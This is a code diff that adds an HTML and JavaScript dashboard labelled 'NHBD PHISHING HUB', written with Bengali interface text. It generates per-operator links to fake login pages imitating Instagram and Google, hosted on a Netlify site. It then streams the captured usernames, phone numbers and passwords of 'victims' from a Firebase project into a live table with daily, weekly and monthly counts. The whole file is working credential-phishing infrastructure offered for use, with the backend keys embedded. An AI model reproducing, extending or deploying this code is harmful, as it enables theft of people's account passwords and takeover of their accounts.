@@ -1,0 +1,1170 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+  
+  
+  
+  
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>NOOB HACKER BD</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    :root {
+      --primary: #6366f1;
+      --primary-dark: #4f46e5;
+      --primary-light: #e0e7ff;
+      --secondary: #10b981;
+      --danger: #ef4444;
+      --warning: #f59e0b;
+      --info: #3b82f6;
+      --dark: #1f2937;
+      --light: #f9fafb;
+      --gray-50: #f9fafb;
+      --gray-100: #f3f4f6;
+      --gray-200: #e5e7eb;
+      --gray-300: #d1d5db;
+      --gray-400: #9ca3af;
+      --gray-500: #6b7280;
+      --gray-600: #4b5563;
+      --gray-700: #374151;
+      --gray-800: #1f2937;
+      --gray-900: #111827;
+      --shadow-sm: 0 1px 2px 0 rgba(0, 0, 0, 0.05);
+      --shadow-md: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
+      --shadow-lg: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
+      --shadow-xl: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04);
+      --radius-sm: 0.375rem;
+      --radius: 0.5rem;
+      --radius-md: 0.75rem;
+      --radius-lg: 1rem;
+      --radius-xl: 1.5rem;
+    }
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Inter', 'Segoe UI', system-ui, -apple-system, sans-serif;
+      background: linear-gradient(135deg, #f3f4ff 0%, #f8fafc 100%);
+      color: var(--gray-800);
+      min-height: 100vh;
+      line-height: 1.6;
+    }
+
+    /* Header */
+    .header {
+      background: white;
+      box-shadow: var(--shadow-md);
+      position: sticky;
+      top: 0;
+      z-index: 100;
+    }
+
+    .header-container {
+      max-width: 1400px;
+      margin: 0 auto;
+      padding: 0 24px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      height: 70px;
+    }
+
+    .logo {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .logo-icon {
+      width: 36px;
+      height: 36px;
+      background: linear-gradient(135deg, var(--primary), var(--primary-dark));
+      border-radius: 10px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-size: 18px;
+    }
+
+    .logo-text {
+      font-size: 20px;
+      font-weight: 700;
+      color: var(--gray-900);
+      letter-spacing: -0.5px;
+    }
+
+    .user-info {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+    }
+
+    .user-avatar {
+      width: 40px;
+      height: 40px;
+      background: linear-gradient(135deg, var(--primary), var(--secondary));
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-weight: 600;
+      font-size: 16px;
+    }
+
+    .logout-btn {
+      background: var(--gray-100);
+      color: var(--gray-700);
+      border: none;
+      padding: 8px 18px;
+      border-radius: var(--radius);
+      font-weight: 500;
+      font-size: 14px;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      transition: all 0.2s;
+    }
+
+    .logout-btn:hover {
+      background: var(--gray-200);
+      transform: translateY(-1px);
+    }
+
+    .logout-btn i {
+      font-size: 16px;
+    }
+
+    /* Main Content */
+    .main-container {
+      max-width: 1400px;
+      margin: 0 auto;
+      padding: 24px;
+      display: grid;
+      grid-template-columns: repeat(12, 1fr);
+      gap: 24px;
+    }
+
+    /* Card Styles */
+    .card {
+      background: white;
+      border-radius: var(--radius-lg);
+      box-shadow: var(--shadow-md);
+      overflow: hidden;
+      transition: transform 0.3s, box-shadow 0.3s;
+      border: 1px solid var(--gray-100);
+    }
+
+    .card:hover {
+      box-shadow: var(--shadow-lg);
+      transform: translateY(-2px);
+    }
+
+    .card-header {
+      padding: 20px 24px;
+      border-bottom: 1px solid var(--gray-100);
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .card-title {
+      font-size: 18px;
+      font-weight: 600;
+      color: var(--gray-900);
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .card-title i {
+      color: var(--primary);
+    }
+
+    .card-body {
+      padding: 24px;
+    }
+
+    /* Form Link Card */
+    .form-link-card {
+      grid-column: span 12;
+    }
+
+    .link-container {
+      background: linear-gradient(to right, var(--primary-light), #f0f9ff);
+      border-radius: var(--radius-md);
+      padding: 20px;
+      border-left: 4px solid var(--primary);
+    }
+.links-list {
+  margin-top: 12px;
+  display: flex;
+  flex-direction: column;
+  gap: 12px;
+
+  /* animation related */
+  max-height: 0;
+  opacity: 0;
+  overflow: hidden;
+  transition: max-height 0.35s ease, opacity 0.3s ease;
+}
+
+/* যখন visible থাকবে */
+.links-list.show {
+  max-height: 1000px; /* বড় ভ্যালু রাখলাম যাতে সব কনটেন্ট ফিট হয় */
+  opacity: 1;
+}
+
+
+    .link-display {
+      background: white;
+      border-radius: var(--radius);
+      padding: 16px;
+      font-family: 'Courier New', monospace;
+      font-size: 15px;
+      color: var(--gray-700);
+      border: 1px solid var(--gray-200);
+      word-break: break-all;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 12px;
+    }
+
+    .link-text {
+      flex: 1;
+      padding-right: 16px;
+    }
+
+    .link-text strong {
+      font-family: 'Inter', sans-serif;
+      display: block;
+      margin-bottom: 4px;
+      color: var(--gray-900);
+    }
+
+    .link-actions {
+      display: flex;
+      gap: 10px;
+      flex-shrink: 0;
+    }
+
+    .btn {
+      padding: 10px 20px;
+      border-radius: var(--radius);
+      font-weight: 500;
+      font-size: 14px;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      transition: all 0.2s;
+      border: none;
+      outline: none;
+    }
+
+    .btn-primary {
+      background: var(--primary);
+      color: white;
+    }
+
+    .btn-primary:hover {
+      background: var(--primary-dark);
+      transform: translateY(-1px);
+      box-shadow: 0 4px 12px rgba(79, 70, 229, 0.3);
+    }
+
+    .btn-secondary {
+      background: white;
+      color: var(--gray-700);
+      border: 1px solid var(--gray-300);
+    }
+
+    .btn-secondary:hover {
+      background: var(--gray-50);
+      border-color: var(--gray-400);
+    }
+
+    .btn-sm {
+      padding: 8px 14px;
+      font-size: 13px;
+    }
+
+    /* Stats Cards */
+    .stats-grid {
+      grid-column: span 12;
+      display: grid;
+      grid-template-columns: repeat(4, minmax(0, 1fr));
+      gap: 20px;
+    }
+
+    .stat-card {
+      padding: 20px;
+      display: flex;
+      align-items: center;
+      gap: 16px;
+    }
+
+    .stat-icon {
+      width: 46px;
+      height: 46px;
+      border-radius: 14px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-size: 20px;
+    }
+
+    .stat-icon.total {
+      background: linear-gradient(135deg, var(--primary), #a855f7);
+    }
+
+    .stat-icon.today {
+      background: linear-gradient(135deg, var(--secondary), #22c55e);
+    }
+
+    .stat-icon.week {
+      background: linear-gradient(135deg, var(--info), #0ea5e9);
+    }
+
+    .stat-icon.month {
+      background: linear-gradient(135deg, var(--warning), #f97316);
+    }
+
+    .stat-content {
+      flex: 1;
+    }
+
+    .stat-label {
+      font-size: 14px;
+      color: var(--gray-600);
+      margin-bottom: 4px;
+    }
+
+    .stat-value {
+      font-size: 24px;
+      font-weight: 700;
+      color: var(--gray-900);
+      margin-bottom: 4px;
+    }
+
+    .stat-trend {
+      font-size: 12px;
+      color: var(--gray-500);
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .trend-up {
+      color: var(--secondary);
+    }
+
+    /* Data Table Card */
+    .data-table-card {
+      grid-column: span 12;
+    }
+
+    .live-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      font-size: 13px;
+      color: var(--danger);
+      background: #fef2f2;
+      padding: 6px 10px;
+      border-radius: 999px;
+    }
+
+    .live-badge i {
+      color: #ef4444;
+      font-size: 10px;
+    }
+
+    .filters {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 16px;
+      margin-bottom: 16px;
+      flex-wrap: wrap;
+    }
+
+    .search-box {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      background: var(--gray-50);
+      border-radius: var(--radius);
+      padding: 8px 12px;
+      border: 1px solid var(--gray-200);
+      min-width: 260px;
+      flex: 1;
+    }
+
+    .search-box i {
+      color: var(--gray-400);
+    }
+
+    .search-input {
+      border: none;
+      outline: none;
+      background: transparent;
+      width: 100%;
+      font-size: 14px;
+    }
+
+    .filter-select {
+      padding: 9px 12px;
+      border-radius: var(--radius);
+      border: 1px solid var(--gray-200);
+      background: white;
+      font-size: 14px;
+      color: var(--gray-700);
+      min-width: 180px;
+    }
+
+    .table-container {
+      overflow: auto;
+      border-radius: var(--radius);
+      border: 1px solid var(--gray-200);
+    }
+
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      min-width: 600px;
+    }
+
+    thead {
+      background: var(--gray-50);
+    }
+
+    th, td {
+      padding: 10px 12px;
+      font-size: 14px;
+      text-align: left;
+      border-bottom: 1px solid var(--gray-100);
+    }
+
+    th {
+      font-weight: 600;
+      color: var(--gray-700);
+    }
+
+    tbody tr:hover {
+      background: #f9fafb;
+    }
+
+    .empty-state {
+      text-align: center;
+      padding: 30px 0;
+      color: var(--gray-500);
+    }
+
+    .empty-state i {
+      font-size: 32px;
+      margin-bottom: 8px;
+      color: var(--gray-300);
+    }
+
+    .email-cell {
+      font-family: 'Courier New', monospace;
+      font-size: 13px;
+    }
+
+    .message-cell {
+      max-width: 360px;
+    }
+
+    .time-cell {
+      white-space: nowrap;
+      font-size: 13px;
+      color: var(--gray-600);
+    }
+
+    .pagination {
+      margin-top: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 12px;
+      flex-wrap: wrap;
+    }
+
+    .pagination-info {
+      font-size: 14px;
+      color: var(--gray-600);
+    }
+
+    .pagination-controls {
+      display: flex;
+      gap: 8px;
+    }
+
+    .pagination-btn {
+      padding: 8px 16px;
+      border-radius: var(--radius);
+      border: 1px solid var(--gray-300);
+      background: white;
+      font-weight: 500;
+      cursor: pointer;
+      transition: all 0.2s;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .pagination-btn:hover:not(:disabled) {
+      background: var(--gray-50);
+      border-color: var(--gray-400);
+    }
+
+    .pagination-btn:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+    }
+
+    /* Toast Notification */
+    .toast {
+      position: fixed;
+      bottom: 24px;
+      right: 24px;
+      background: var(--gray-800);
+      color: white;
+      padding: 16px 24px;
+      border-radius: var(--radius);
+      box-shadow: var(--shadow-xl);
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      z-index: 1000;
+      transform: translateY(100px);
+      opacity: 0;
+      transition: transform 0.3s, opacity 0.3s;
+    }
+
+    .toast.show {
+      transform: translateY(0);
+      opacity: 1;
+    }
+
+    .toast i {
+      font-size: 20px;
+    }
+
+    .toast.success i {
+      color: var(--secondary);
+    }
+
+    .toast.error i {
+      color: var(--danger);
+    }
+
+    /* Responsive */
+    @media (max-width: 1200px) {
+      .main-container {
+        grid-template-columns: repeat(6, 1fr);
+        padding: 20px;
+      }
+      .form-link-card,
+      .stats-grid,
+      .data-table-card {
+        grid-column: span 6;
+      }
+      .stats-grid {
+        grid-template-columns: repeat(2, minmax(0, 1fr));
+      }
+    }
+
+    @media (max-width: 768px) {
+      .header-container {
+        padding: 0 16px;
+      }
+      
+      .main-container {
+        grid-template-columns: 1fr;
+        padding: 16px;
+        gap: 20px;
+      }
+      
+      .form-link-card,
+      .stats-grid,
+      .data-table-card {
+        grid-column: span 1;
+      }
+      
+      .stats-grid {
+        grid-template-columns: 1fr;
+      }
+      
+      .filters {
+        flex-direction: column;
+        align-items: stretch;
+      }
+      
+      .search-box {
+        min-width: auto;
+      }
+      
+      .link-display {
+        flex-direction: column;
+        align-items: stretch;
+      }
+      
+      .link-text {
+        padding-right: 0;
+        width: 100%;
+      }
+      
+      .link-actions {
+        width: 100%;
+        justify-content: flex-end;
+      }
+      
+      .logout-btn span {
+        display: none;
+      }
+      
+      .logout-btn {
+        padding: 10px;
+        width: 44px;
+        height: 44px;
+        justify-content: center;
+      }
+    }
+  </style>
+</head>
+<body>
+  <!-- Header -->
+  <header class="header">
+    <div class="header-container">
+      <div class="logo">
+        <div class="logo-icon">
+          <i class="fas fa-comment-alt"></i>
+        </div>
+        <div class="logo-text">NHBD PHISHING HUB</div>
+      </div>
+      
+      <div class="user-info">
+        <div class="user-avatar" id="userAvatar">U</div>
+        <button class="logout-btn" id="logoutBtn">
+          <i class="fas fa-sign-out-alt"></i>
+          <span>লগআউট</span>
+        </button>
+      </div>
+    </div>
+  </header>
+
+  <!-- Main Content -->
+  <main class="main-container">
+    <!-- Form Link Card -->
+    <section class="card form-link-card">
+  </button><div class="card-header">
+  <h2 class="card-title">
+    <i class="fas fa-link"></i>
+    Phishing lings
+  </h2>
+
+  <!-- Toggle Button -->
+  <button id="toggleUrlsBtn" class="btn btn-primary btn-sm">
+    <i class="fas fa-eye"></i>
+    Show URLs
+  </button>
+</div>
+      <div class="card-body">
+        <div class="link-container">
+          <p style="color: var(--gray-700); margin-bottom: 8px;">
+            ব্যবহারবিধি :- উপরে Show  URLs বাটনে ক্লিক করুন তাহলে সব URL দেখতে পারবেন, এবং আপনার চাহিদা অনুযায়ী লিংক ব্যবহার করতে পারেন।
+          </p>
+          <div id="linksList" class="links-list">
+            <!-- জাভাস্ক্রিপ্ট থেকে এখানে সব লিংক বসবে -->
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Stats Cards -->
+    <section class="stats-grid">
+      <div class="card stat-card">
+        <div class="stat-icon total">
+          <i class="fas fa-inbox"></i>
+        </div>
+        <div class="stat-content">
+          <div class="stat-label">মোট Victem</div>
+          <div class="stat-value" id="totalCount">0</div>
+          <div class="stat-trend">
+            <i class="fas fa-chart-line trend-up"></i>
+            <span>সব সময়</span>
+          </div>
+        </div>
+      </div>
+      
+      <div class="card stat-card">
+        <div class="stat-icon today">
+          <i class="fas fa-calendar-day"></i>
+        </div>
+        <div class="stat-content">
+          <div class="stat-label">আজকের login</div>
+          <div class="stat-value" id="todayCount">0</div>
+          <div class="stat-trend">
+            <i class="fas fa-arrow-up trend-up"></i>
+            <span>আজ</span>
+          </div>
+        </div>
+      </div>
+      
+      <div class="card stat-card">
+        <div class="stat-icon week">
+          <i class="fas fa-calendar-week"></i>
+        </div>
+        <div class="stat-content">
+          <div class="stat-label">গত ৭ দিন</div>
+          <div class="stat-value" id="weekCount">0</div>
+          <div class="stat-trend">
+            <i class="fas fa-chart-bar"></i>
+            <span>সাপ্তাহিক</span>
+          </div>
+        </div>
+      </div>
+      
+      <div class="card stat-card">
+        <div class="stat-icon month">
+          <i class="fas fa-calendar-alt"></i>
+        </div>
+        <div class="stat-content">
+          <div class="stat-label">গত ৩০ দিন</div>
+          <div class="stat-value" id="monthCount">0</div>
+          <div class="stat-trend">
+            <i class="fas fa-chart-pie"></i>
+            <span>মাসিক</span>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Data Table Card -->
+    <section class="card data-table-card">
+      <div class="card-header">
+        <h2 class="card-title">
+          <i class="fas fa-table"></i>
+          ফিডব্যাক ডাটা
+        </h2>
+        <div class="live-badge">
+          <i class="fas fa-circle"></i>
+          রিয়েল-টাইম আপডেট
+        </div>
+      </div>
+      <div class="card-body">
+        <div class="filters">
+          <div class="search-box">
+            <i class="fas fa-search"></i>
+            <input type="text" id="searchInput" class="search-input" placeholder="ইমেইল বা বার্তা অনুসন্ধান করুন...">
+          </div>
+          <select id="filterDate" class="filter-select">
+            <option value="">সময় অনুসারে ফিল্টার</option>
+            <option value="today">শুধুমাত্র আজ</option>
+            <option value="week">গত ৭ দিন</option>
+            <option value="month">গত ৩০ দিন</option>
+          </select>
+        </div>
+        
+        <div class="table-container">
+          <table>
+            <thead>
+              <tr>
+                <th>GMAIL/NUMBER</th>
+                <th>Password</th>
+                <th></th>
+                <th>জমা দেওয়ার সময়</th>
+              </tr>
+            </thead>
+            <tbody id="tableBody">
+              <tr>
+                <td colspan="4" class="empty-state">
+                  <i class="fas fa-inbox"></i>
+                  <div style="font-size: 16px; margin-bottom: 8px;">কোনো ডাটা পাওয়া যায়নি</div>
+                  <div style="font-size: 14px;">আপনার লিংক শেয়ার করে প্রথম ফিডব্যাক পান</div>
+                </td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+        
+        <div class="pagination">
+          <div class="pagination-info" id="pageInfo">মোট 0 রেকর্ড</div>
+          <div class="pagination-controls">
+            <button class="pagination-btn" id="prevPage">
+              <i class="fas fa-chevron-left"></i>
+              আগের
+            </button>
+            <button class="pagination-btn" id="nextPage">
+              পরের
+              <i class="fas fa-chevron-right"></i>
+            </button>
+          </div>
+        </div>
+      </div>
+    </section>
+  </main>
+
+  <!-- Toast Notification -->
+  <div class="toast" id="toast">
+    <i class="fas fa-check-circle"></i>
+    <span id="toastMessage">লিংক কপি করা হয়েছে!</span>
+  </div>
+
+  <!-- Firebase SDK -->
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-auth-compat.js"></script>
+
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-auth-compat.js"></script>
+
+<script>
+  const firebaseConfig = {
+    apiKey: "AIzaSyDj5FT2W0F-x62GI2SSi4d_Y-Vtg5ztSXk",
+    authDomain: "phishing-web-5fbfc.firebaseapp.com",
+    projectId: "phishing-web-5fbfc",
+    storageBucket: "phishing-web-5fbfc.firebasestorage.app",
+    messagingSenderId: "552393373788",
+    appId: "1:552393373788:web:a460df425a2bbc40688e99",
+    measurementId: "G-1LQ68R9H4B"
+  };
+
+  // ---- Firebase safe init ----
+  let db = null;
+  let auth = null;
+
+  if (typeof firebase !== 'undefined') {
+    firebase.initializeApp(firebaseConfig);
+    db   = firebase.firestore();
+    auth = firebase.auth();
+  } else {
+    console.error('Firebase SDK load হয়নি। ইন্টারনেট/হোস্টিং চেক করো।');
+  }
+
+  // DOM Elements
+  const tableBody    = document.getElementById('tableBody');
+  const searchInput  = document.getElementById('searchInput');
+  const filterDate   = document.getElementById('filterDate');
+  const statsTotal   = document.getElementById('totalCount');
+  const statsToday   = document.getElementById('todayCount');
+  const statsWeek    = document.getElementById('weekCount');
+  const statsMonth   = document.getElementById('monthCount');
+  const prevBtn      = document.getElementById('prevPage');
+  const nextBtn      = document.getElementById('nextPage');
+  const pageInfo     = document.getElementById('pageInfo');
+  const logoutBtn    = document.getElementById('logoutBtn');
+  const userAvatar   = document.getElementById('userAvatar');
+  const toast        = document.getElementById('toast');
+  const toastMessage = document.getElementById('toastMessage');
+  const linksListEl  = document.getElementById('linksList');
+
+  const itemsPerPage = 10;
+  let allData = [];
+  let filteredData = [];
+  let currentPage = 1;
+  let unsubscribe = null;
+  let currentUser = null;
+
+  // 👉 এখানে তোমার আলাদা আলাদা ডিজাইনের মূল URL গুলো বসাবে
+  const FORM_TEMPLATES = [
+    { id: "url1", label: "URL 1 - Design 1", baseUrl: "https://myloginsecurity.netlify.app" },
+    { id: "url2", label: "URL 2 - Design 2", baseUrl: "https://myloginsecurity.netlify.app/insta.html" },
+    { id: "url3", label: "URL 3 - Design 3", baseUrl: "https://myloginsecurity.netlify.app/Google.html" },
+    { id: "url4", label: "URL 4 - Design 4", baseUrl: "https://myloginsecurity.netlify.app/1৪+.html" }
+  ];
+
+  let currentFormLinks = [];
+
+  // Toast
+  function showToast(message, type = 'success') {
+    toastMessage.textContent = message;
+    toast.className = `toast ${type}`;
+    toast.classList.add('show');
+    setTimeout(() => toast.classList.remove('show'), 3000);
+  }
+
+  // 👉 গ্লোবাল করে দিলাম যাতে onclick থেকে ১০০% কাজ করে
+  window.copyFormLink = async function (index) {
+    const item = currentFormLinks[index];
+    if (!item) return;
+    try {
+      await navigator.clipboard.writeText(item.url);
+      showToast('লিংক কপি করা হয়েছে!');
+    } catch (e) {
+      showToast('অটো কপি হয়নি, লিংকটি ম্যানুয়ালি কপি করুন', 'error');
+    }
+  };
+
+  window.openFormLink = function (index) {
+    const item = currentFormLinks[index];
+    if (!item) return;
+    window.open(item.url, '_blank');
+  };
+
+  // UID দিয়ে সব লিংক বানিয়ে UI-তে বসাই
+  function buildFormLinksForUser(uid) {
+    currentFormLinks = FORM_TEMPLATES.map(t => ({
+      id: t.id,
+      label: t.label,
+      url: t.baseUrl + (t.baseUrl.includes('?') ? '&' : '?') + 'uid=' + encodeURIComponent(uid)
+    }));
+
+    linksListEl.innerHTML = '';
+    currentFormLinks.forEach((item, index) => {
+      const div = document.createElement('div');
+      div.className = 'link-display';
+      div.innerHTML = `
+        <div class="link-text">
+          <strong>${item.label}</strong>
+          <span>${item.url}</span>
+        </div>
+        <div class="link-actions">
+          <button class="btn btn-primary btn-sm" onclick="copyFormLink(${index})">
+            <i class="far fa-copy"></i>
+            কপি করুন
+          </button>
+          <button class="btn btn-secondary btn-sm" onclick="openFormLink(${index})">
+            <i class="fas fa-external-link-alt"></i>
+            ওপেন করুন
+          </button>
+        </div>
+      `;
+      linksListEl.appendChild(div);
+    });
+  }
+
+// --- URL Show/Hide Toggle with animation ---
+let urlsVisible = false; // default: hidden
+
+const toggleBtn = document.getElementById('toggleUrlsBtn');
+const linksContainer = document.getElementById('linksList');
+
+// প্রথমে hidden অবস্থা
+linksContainer.classList.remove('show');
+toggleBtn.innerHTML = '<i class="fas fa-eye"></i> Show URLs';
+
+toggleBtn.addEventListener("click", () => {
+  urlsVisible = !urlsVisible;
+
+  if (urlsVisible) {
+    linksContainer.classList.add('show');
+    toggleBtn.innerHTML = '<i class="fas fa-eye-slash"></i> Hide URLs';
+  } else {
+    linksContainer.classList.remove('show');
+    toggleBtn.innerHTML = '<i class="fas fa-eye"></i> Show URLs';
+  }
+});
+
+
+  // ---- টেবিল/ডাটা/স্ট্যাটস ফাংশনগুলো আগের মতোই ----
+  function renderTable() {
+    if (!filteredData.length) {
+      tableBody.innerHTML = `
+        <tr>
+          <td colspan="4" class="empty-state">
+            <i class="fas fa-inbox"></i>
+            <div style="font-size: 16px; margin-bottom: 8px;">কোনো ডাটা পাওয়া যায়নি</div>
+            <div style="font-size: 14px;">আপনার ফর্ম লিংক শেয়ার করে প্রথম ফিডব্যাক পান</div>
+          </td>
+        </tr>
+      `;
+      pageInfo.textContent = 'মোট 0 রেকর্ড';
+      prevBtn.disabled = true;
+      nextBtn.disabled = true;
+      return;
+    }
+
+    const totalPages = Math.ceil(filteredData.length / itemsPerPage);
+    if (currentPage > totalPages) currentPage = totalPages;
+
+    const startIndex = (currentPage - 1) * itemsPerPage;
+    const endIndex   = startIndex + itemsPerPage;
+    const pageData   = filteredData.slice(startIndex, endIndex);
+
+    let html = '';
+    pageData.forEach(item => {
+      const time = item.timestamp
+        ? new Date(item.timestamp).toLocaleString('bn-BD', {
+            year: 'numeric',
+            month: 'short',
+            day: 'numeric',
+            hour: '2-digit',
+            minute: '2-digit'
+          })
+        : '-';
+
+      const message = item.message || '-';
+      const truncatedMessage = message.length > 80 ? message.substring(0, 80) + '...' : message;
+
+      html += `
+        <tr>
+          <td><strong>${item.name || 'N/A'}</strong></td>
+          <td class="email-cell">${item.email || 'N/A'}</td>
+          <td class="message-cell" title="${message}">${truncatedMessage}</td>
+          <td class="time-cell">${time}</td>
+        </tr>
+      `;
+    });
+
+    tableBody.innerHTML = html;
+    pageInfo.textContent = `মোট ${filteredData.length} রেকর্ড, পৃষ্ঠা ${currentPage} / ${totalPages}`;
+    prevBtn.disabled = currentPage === 1;
+    nextBtn.disabled = currentPage === totalPages;
+  }
+
+  function applyFilters() {
+    const search = (searchInput.value || '').toLowerCase();
+    const dateFilter = filterDate.value;
+
+    filteredData = allData.filter(item => {
+      const text = (item.name || '') + ' ' + (item.email || '') + ' ' + (item.message || '');
+      if (search && !text.toLowerCase().includes(search)) return false;
+
+      if (dateFilter && item.timestamp) {
+        const now = new Date();
+        const t   = new Date(item.timestamp);
+        if (dateFilter === 'today') {
+          const todayStart = new Date(now.getFullYear(), now.getMonth(), now.getDate());
+          if (t < todayStart) return false;
+        } else if (dateFilter === 'week') {
+          const weekAgo = new Date(now.getTime() - 7*24*60*60*1000);
+          if (t < weekAgo) return false;
+        } else if (dateFilter === 'month') {
+          const monthAgo = new Date(now.getTime() - 30*24*60*60*1000);
+          if (t < monthAgo) return false;
+        }
+      }
+      return true;
+    });
+
+    currentPage = 1;
+    renderTable();
+  }
+
+  function updateStats() {
+    const now = new Date();
+    let total = allData.length;
+    let today = 0, week = 0, month = 0;
+
+    allData.forEach(item => {
+      if (!item.timestamp) return;
+      const t = new Date(item.timestamp);
+
+      const todayStart = new Date(now.getFullYear(), now.getMonth(), now.getDate());
+      const weekAgo  = new Date(now.getTime() - 7*24*60*60*1000);
+      const monthAgo = new Date(now.getTime() - 30*24*60*60*1000);
+
+      if (t >= todayStart) today++;
+      if (t >= weekAgo) week++;
+      if (t >= monthAgo) month++;
+    });
+
+    statsTotal.textContent = total;
+    statsToday.textContent = today;
+    statsWeek.textContent  = week;
+    statsMonth.textContent = month;
+  }
+
+  function subscribeToData(uid) {
+    if (!db) return;
+    if (unsubscribe) unsubscribe();
+    
+    unsubscribe = db
+      .collection('users')
+      .doc(uid)
+      .collection('submissions')
+      .orderBy('timestamp', 'desc')
+      .onSnapshot(snapshot => {
+        allData = [];
+        snapshot.forEach(doc => {
+          allData.push({ id: doc.id, ...doc.data() });
+        });
+        applyFilters();
+        updateStats();
+      }, err => {
+        console.error(err);
+        tableBody.innerHTML = `
+          <tr>
+            <td colspan="4" class="empty-state">
+              <i class="fas fa-exclamation-triangle"></i>
+              <div style="font-size: 16px; margin-bottom: 8px;">ডাটা লোড করতে সমস্যা হয়েছে</div>
+              <div style="font-size: 14px;">ইন্টারনেট সংযোগ পরীক্ষা করুন</div>
+            </td>
+          </tr>
+        `;
+      });
+  }
+
+  // ইভেন্ট লিসেনার
+  searchInput.addEventListener('input', applyFilters);
+  filterDate.addEventListener('change', applyFilters);
+
+  prevBtn.addEventListener('click', () => {
+    if (currentPage > 1) {
+      currentPage--;
+      renderTable();
+    }
+  });
+
+  nextBtn.addEventListener('click', () => {
+    const totalPages = Math.ceil(filteredData.length / itemsPerPage);
+    if (currentPage < totalPages) {
+      currentPage++;
+      renderTable();
+    }
+  });
+
+  // 👉 Logout সব অবস্থাতেই redirect করবে
+  logoutBtn.addEventListener('click', async () => {
+    try {
+      if (auth) {
+        await auth.signOut();
+      }
+    } catch (e) {
+      console.warn('signOut error', e);
+    }
+    window.location.href = 'auth.html';
+  });
+
+  // Auth state
+  if (auth) {
+    auth.onAuthStateChanged(user => {
+      if (!user) {
+        window.location.href = 'auth.html';
+        return;
+      }
+
+      currentUser = user;
+
+      const email = user.email || 'U';
+      userAvatar.textContent = email.charAt(0).toUpperCase();
+
+      // 👉 এখানে লিংক বানানো হয়
+      buildFormLinksForUser(user.uid);
+
+      // সাবমিশন লিসেনার
+      subscribeToData(user.uid);
+    });
+  } else {
+    // Firebase না থাকলেও অন্তত placeholder uid দিয়ে লিংক দেখাও
+    buildFormLinksForUser('guest');
+  }
+</script>
+
+
+  
+</body>
+</html>
